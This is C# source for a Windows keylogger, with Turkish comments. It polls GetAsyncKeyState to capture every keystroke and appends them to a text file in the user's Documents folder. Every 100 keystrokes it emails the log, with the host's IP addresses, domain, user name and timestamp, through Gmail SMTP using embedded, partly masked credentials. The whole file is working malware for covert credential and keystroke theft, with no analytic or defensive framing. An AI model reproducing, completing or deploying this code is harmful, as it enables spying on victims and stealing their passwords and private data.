using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int i); 
        static long numberOfKeysyrokes = 0;
        private static string folderName;

        static void Main(string[] args)
        {
            String dosyayolu = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(dosyayolu))
            {
                Directory.CreateDirectory(dosyayolu);
            }

            string yol = dosyayolu + @"\KeyLogger.txt";
            if (!File.Exists(yol))
            {
                using (StreamWriter sw = File.CreateText(yol))
                {
                 
                }
            }


            //Plan
            //1. Tuş vuruşlarını yakalayın ve bunları konsolda görüntüleme

            while (true)
            {
                Thread.Sleep(3);

                for (int i = 0; i < 128; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        Console.Write((char)i + ",");

                        using (StreamWriter sw = File.AppendText(yol))
                        {
                            sw.Write((char)i);
                        }

                        numberOfKeysyrokes++; // ← SADECE TUŞ BASILDIĞINDA ARTTIR

                        // her 100 karakterde bir e-posta gönder
                        if (numberOfKeysyrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }

            //3. Dosyayı e-posta ile gönderme
        }
        static void SendNewMessage()
        {
            //Mail Gönderme
            String folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderPath + @"\KeyLogger.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //Mail oluşturma
            DateTime now = DateTime.Now;
            String subject = "Keylogger Mesajı";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adres in host.AddressList)
            {
                emailBody += "Adres: " + adres;
            }

            emailBody += "\n Kullanıcı: " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\n Zaman: " + now.ToString();
            emailBody += "\n host: " + host;
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMesaj = new MailMessage();

            mailMesaj.From = new MailAddress("kerem**selcuk@gmail.com");
            mailMesaj.To.Add("kerem**selcuk@gmail.com");
            mailMesaj.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl= true;
            client.Credentials = new NetworkCredential("kerem**selcuk@gmail.com" , "**** egwt **** drdo");//Şirefre gizlendi
            mailMesaj.Body = emailBody;

            client.Send(mailMesaj);

        }
    }
}


